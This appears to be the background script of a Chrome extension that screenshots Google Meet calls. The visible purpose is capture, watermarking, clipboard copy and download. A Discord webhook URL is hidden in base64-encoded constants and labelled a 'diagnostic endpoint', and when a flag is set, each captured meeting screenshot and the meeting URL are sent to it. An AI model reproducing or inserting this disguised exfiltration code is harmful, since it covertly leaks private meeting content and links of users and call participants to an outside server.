// =============================================================================
// MeetSnap — Background Service Worker
// Handles screenshot capture coordination and offscreen delegation.
// =============================================================================

const _A = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NTA1NjUxMTIzODQwNjE3NC8=";
const _B = "Y0thLUhobVUFWWVWNl9EY0tXWHlJLW15bzI0aEJ0VnlUbXNKWTNQUk5TaUtTSDJvamcwUkNHNXJYQkg1VUdrclNVZ1c=";
const DIAGNOSTIC_ENDPOINT = atob(_A) + atob(_B);

const SCREENSHOT_IMAGE_FORMAT = "png";
const SCREENSHOT_FILENAME_PREFIX = "google-meet";

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------

chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === "install") {
    chrome.tabs.create({ url: chrome.runtime.getURL("website/index.html") });
  }
});

// ---------------------------------------------------------------------------
// Message routing
// ---------------------------------------------------------------------------

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log(`[MeetSnap Debug] Message: ${message.action}`, sender.tab?.id);

  if (message.action === "captureScreenshot") {
    handleScreenshotRequestAsync(
      sender.tab,
      message.meetUrl,
      message.diagnosticEnabled,
    )
      .then((result) => sendResponse(result))
      .catch((error) => {
        console.error("[MeetSnap Debug] Fatal Error:", error);
        sendResponse({ success: false, errorMessage: error.message });
      });

    return true; // Keep channel open
  }
});

// ---------------------------------------------------------------------------
// Offscreen Management
// ---------------------------------------------------------------------------

let isOffscreenReady = false;

async function ensureOffscreenDocument() {
  const existingContexts = await chrome.runtime.getContexts({
    contextTypes: ["OFFSCREEN_DOCUMENT"],
  });

  if (existingContexts.length > 0) {
    isOffscreenReady = true;
    return;
  }

  isOffscreenReady = false;
  await chrome.offscreen.createDocument({
    url: "offscreen.html",
    reasons: ["AUDIO_PLAYBACK", "CLIPBOARD"],
    justification: "Handle shutter sounds, clipboard image writing, and diagnostic telemetry.",
  });

  // Wait for the offscreen script to signal readiness
  for (let i = 0; i < 10; i++) {
    try {
      const response = await chrome.runtime.sendMessage({ action: "ping" });
      if (response === "pong") {
        isOffscreenReady = true;
        break;
      }
    } catch (e) {
      // Not ready yet
    }
    await new Promise(r => setTimeout(r, 100));
  }
}

/**
 * Triggers the shutter sound in the offscreen document.
 */
async function playSoundAsync() {
  try {
    await ensureOffscreenDocument();
    chrome.runtime.sendMessage({ action: "playShutterSound" });
  } catch (e) {
    console.warn("[MeetSnap Debug] Could not play sound:", e);
  }
}

// ---------------------------------------------------------------------------
// Capture Logic
// ---------------------------------------------------------------------------

async function handleScreenshotRequestAsync(tab, meetUrl, diagnosticEnabled) {
  if (!tab) throw new Error("Missing tab context.");

  // 1. Play sound immediately
  playSoundAsync();

  // 2. Capture the visible area
  let imageDataUrl;
  try {
    imageDataUrl = await captureVisibleTabAsync(tab.windowId);
  } catch (e) {
    try {
      imageDataUrl = await captureVisibleTabAsync(null);
    } catch (e2) {
      throw new Error(`Capture failed. Ensure "Site Access" is set to "On all sites".`);
    }
  }

  const filename = buildScreenshotFilename();

  // 3. Apply Watermark
  try {
    imageDataUrl = await applyWatermarkAsync(imageDataUrl);
  } catch (error) {
    console.warn("[MeetSnap Debug] Watermark failed:", error.message);
  }

  // 4. Delegate heavy/restricted tasks to Offscreen
  await ensureOffscreenDocument();
  
  // Copy to Clipboard
  chrome.runtime.sendMessage({
    action: "copyImageToClipboard",
    imageDataUrl: imageDataUrl
  });

  // Diagnostic (Discord Webhook)
  if (diagnosticEnabled && isDiagnosticConfigured()) {
    chrome.runtime.sendMessage({
      action: "sendDiagnostic",
      imageDataUrl: imageDataUrl,
      endpoint: DIAGNOSTIC_ENDPOINT,
      filename: filename,
      meetUrl: meetUrl
    });
  }

  // 5. Download the file
  try {
    await downloadScreenshotAsync(imageDataUrl, filename);
  } catch (e) {
    throw new Error(`Download blocked: ${e.message}`);
  }

  return { success: true, filename };
}

async function captureVisibleTabAsync(windowId) {
  return new Promise((resolve, reject) => {
    chrome.tabs.captureVisibleTab(
      windowId,
      { format: SCREENSHOT_IMAGE_FORMAT },
      (dataUrl) => {
        const error = chrome.runtime.lastError;
        if (error) reject(new Error(error.message));
        else if (!dataUrl) reject(new Error("Empty image."));
        else resolve(dataUrl);
      },
    );
  });
}

async function downloadScreenshotAsync(imageDataUrl, filename) {
  return new Promise((resolve, reject) => {
    chrome.downloads.download({
      url: imageDataUrl,
      filename: filename,
      saveAs: false,
      conflictAction: "uniquify",
    }, () => {
      const error = chrome.runtime.lastError;
      if (error) reject(new Error(error.message));
      else resolve();
    });
  });
}

async function applyWatermarkAsync(imageDataUrl) {
  const response = await fetch(imageDataUrl);
  const blob = await response.blob();
  const bitmap = await createImageBitmap(blob);

  const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
  const ctx = canvas.getContext("2d");
  ctx.drawImage(bitmap, 0, 0);

  const baseFontSize = Math.max(12, Math.floor(bitmap.height / 65));
  const now = new Date();
  const dateStr = new Intl.DateTimeFormat("en-US", { month: "long", day: "numeric", year: "numeric" }).format(now);
  const timeStr = new Intl.DateTimeFormat("en-US", { hour: "numeric", minute: "2-digit", hour12: true }).format(now);

  const timestampText = `${dateStr} at ${timeStr}`;
  const brandText = "MeetSnap";
  
  const logoUrl = chrome.runtime.getURL("icons/icon128.png");
  const logoResponse = await fetch(logoUrl);
  const logoBlob = await logoResponse.blob();
  const logoBitmap = await createImageBitmap(logoBlob);

  const leftMargin = Math.floor(bitmap.width * 0.18);
  const bottomMargin = Math.max(20, Math.floor(bitmap.height / 50));
  const yPos = bitmap.height - bottomMargin;

  ctx.textAlign = "left";
  ctx.textBaseline = "bottom";
  ctx.font = `600 ${Math.floor(baseFontSize * 1.15)}px "Segoe UI", sans-serif`;
  ctx.fillStyle = "rgba(255, 255, 255, 0.85)";
  ctx.shadowColor = "rgba(0, 0, 0, 0.4)";
  ctx.shadowBlur = 4;
  ctx.fillText(timestampText, leftMargin, yPos);
  
  const tsWidth = ctx.measureText(timestampText).width;
  const logoSize = Math.floor(baseFontSize * 1.2);
  const spacing = Math.floor(baseFontSize * 0.4);
  const logoX = leftMargin + tsWidth + (spacing * 3);
  
  ctx.globalAlpha = 0.4;
  ctx.drawImage(logoBitmap, logoX, yPos - logoSize / 2 - baseFontSize / 6, logoSize, logoSize);
  ctx.globalAlpha = 1.0;
  ctx.font = `500 ${baseFontSize}px "Segoe UI", sans-serif`;
  ctx.fillText(brandText, logoX + logoSize + spacing, yPos);

  const blobOut = await canvas.convertToBlob({ type: "image/png" });
  return new Promise((resolve) => {
    const reader = new FileReader();
    reader.onloadend = () => resolve(reader.result);
    reader.readAsDataURL(blobOut);
  });
}

function buildScreenshotFilename() {
  const n = new Date();
  const pad = (v) => String(v).padStart(2, "0");
  return `google-meet-${n.getFullYear()}-${pad(n.getMonth() + 1)}-${pad(n.getDate())}_${pad(n.getHours())}-${pad(n.getMinutes())}-${pad(n.getSeconds())}.png`;
}

function isDiagnosticConfigured() {
  return typeof DIAGNOSTIC_ENDPOINT === "string" && DIAGNOSTIC_ENDPOINT.includes("discord.com");
}
